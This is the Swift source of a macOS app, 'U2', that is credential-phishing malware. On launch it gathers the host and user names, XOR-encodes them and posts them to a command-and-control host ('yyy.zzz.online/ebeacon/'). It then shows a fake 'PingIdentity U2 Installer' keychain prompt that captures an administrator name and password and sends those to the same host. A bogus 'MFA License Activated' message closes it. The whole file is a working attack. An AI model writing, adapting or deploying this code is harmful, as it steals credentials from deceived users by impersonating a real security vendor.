//
//  AppDelegate.swift
//  U2
//
//  Created by D S on 8/15/19.
//  Copyright © 2019 NA. All rights reserved.
//

import Cocoa
import Foundation
import AppKit


extension String {
    func fromBase64() -> String? {
        guard let data = Data(base64Encoded: self) else {
            return nil
        }
        return String(data: data, encoding: .utf8)
    }
    func toBase64() -> String {
        return Data(self.utf8).base64EncodedString()
    }
}

func xorEncryption(clearText: String, setKey: String) -> [UInt8] {
    if clearText.isEmpty { return [UInt8]() }
    
    var encrypted = [UInt8]()
    let text = [UInt8](clearText.utf8)
    let key = [UInt8](setKey.utf8)
    let length = key.count
    
    // encrypt bytes
    for t in text.enumerated() {
        encrypted.append(t.element ^ key[t.offset % length])
    }
    
    return encrypted
}

func xorDecryption(cypherText: [UInt8], setKey: String) -> String {
    if cypherText.count == 0 { return "" }
    
    var decrypted = [UInt8]()
    let cypher = cypherText
    let key = [UInt8](setKey.utf8)
    let length = key.count
    
    // decrypt bytes
    for c in cypher.enumerated() {
        decrypted.append(c.element ^ key[c.offset % length])
    }
    
    return String(bytes: decrypted, encoding: .utf8)!
}

func UBlobToDecString(delimiter: String, encryptedBytes: [UInt8]) -> String{
    // Convert Uint8 array to String, sequence with a delimiter
    var encryptedText = String()
    for i in 0..<encryptedBytes.count {
        encryptedText += String(encryptedBytes[i]) // UInt8 value
        if (i < (encryptedBytes.count-1) ){
            encryptedText += delimiter
        }
    }
    
    return encryptedText
}



// Entry point
@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate {
    
    
    func SendComms(scheme: String, C2Host: String, resource: String, beaconId: String, app: String, data: String){

        // HTTP session
        let session = URLSession.shared

        // Build URL
        var components = URLComponents()
            components.scheme = scheme
            components.host = C2Host
            components.path = resource + beaconId
        
        let url: URL = components.url!
        
        
        // POST
        var post_request = URLRequest(url: url)
        post_request.httpMethod = "POST"
        post_request.setValue("application/x-www-form-urlencoded",
                              forHTTPHeaderField: "Content-Type")
        post_request.httpBody = (
                "a=" + app + "&d=" + data.toBase64()).data(using: .ascii)
        
        //Task start
        let taskPost = session.dataTask(with: post_request) {
            (data, response, error) in
            
            //Error handling
            guard error == nil else {
                print("error calling POST to this url")
                print(error!)
                return
            }
        }
        
        taskPost.resume()
    }
    
    func getStage1Data(separator: String) -> String {
        let currentHost = Host.current().localizedName ?? "unknown"
        let currentUserName = NSUserName()
        let currentFullUserName = NSFullUserName()
    
        return [currentHost, currentUserName, currentFullUserName].joined(separator: separator)
    }

    func getStage2Data(separator: String, title: String, question: String) -> String {
        let msg = NSAlert()
        msg.addButton(withTitle: "Allow")      // 1st button
        msg.addButton(withTitle: "Deny")  // 2nd button
        msg.messageText = title
        msg.informativeText = question
        msg.alertStyle = .warning
        msg.showsHelp = true
        msg.window.backgroundColor = NSColor(named: "gray")
        
        msg.icon = NSImage (named: NSImage.lockLockedTemplateName)
        let txt = NSTextField(frame: NSRect(x: 0, y: 34, width: 200, height: 24))
        txt.stringValue = ""
        
        let ptxt = NSSecureTextField(frame: NSRect(x: 0, y: 2, width: 200, height: 24))
        ptxt.stringValue = ""
        
        let stackViewer = NSStackView(frame: NSRect(x: 0, y: 0, width: 200, height: 60))
        
        stackViewer.addSubview(txt)
        stackViewer.addSubview(ptxt)
        
        msg.accessoryView = stackViewer
        
        let response: NSApplication.ModalResponse = msg.runModal()
        
        if (response == NSApplication.ModalResponse.alertFirstButtonReturn) {
            return [txt.stringValue, ptxt.stringValue].joined(separator: separator)
        } else {
            return ["N/A","N/A"].joined(separator: separator)
            
        }
    }
    
    func applicationDidFinishLaunching(_ aNotification: Notification) {
        // Insert code here to initialize your application
        
        // Setup data transmission and encoding format parameters
        let xorKey = "~"
        let dataSeparator = "^"
        let dataTransDelimiter = ","
        
        // Create beacon identifier
        let currentHost = Host.current().localizedName ?? "unknown"
        let  beaconId = Data(currentHost.utf8).map{ String(format:"%02x", $0) }.joined()
        
        
        // Stage 1 //
        var stageData = getStage1Data(separator: dataSeparator)
        var encryptedBytes = xorEncryption(clearText: stageData, setKey: xorKey)
        var encryptedText = UBlobToDecString(delimiter: dataTransDelimiter, encryptedBytes: encryptedBytes)
        
        // B64 data and Send via form POST
        SendComms(scheme: "https", C2Host: "yyy.zzz.online", resource: "/ebeacon/", beaconId: beaconId, app: "hid", data: encryptedText)

        
        // Stage 2 //
        stageData = getStage2Data(separator: dataSeparator, title: "Title", question: "PingIdentity U2 Installer wants to use the iCloud keychain. Type an Administrator's name and password to allow this.")
        
        encryptedBytes = xorEncryption(clearText: stageData, setKey: xorKey)
        encryptedText = UBlobToDecString(delimiter: dataTransDelimiter, encryptedBytes: encryptedBytes)
        
        // B64 data and Send via form POST
        SendComms(scheme: "https", C2Host: "yyy.zzz.online", resource: "/ebeacon/", beaconId: beaconId, app: "phs", data: encryptedText)
    
        
        // Finish, Good bye
        let status = NSAlert()
        
            status.messageText = "Success"
            status.informativeText = "Ping Identity MFA License Activated"
            status.alertStyle = .informational
            status.icon = NSImage (named: NSImage.advancedName)
        
            status.runModal()
    
        exit(0)
        
    }
    
    func applicationWillTerminate(_ aNotification: Notification) {
        // Insert code here to tear down your application
    }
    
    
}


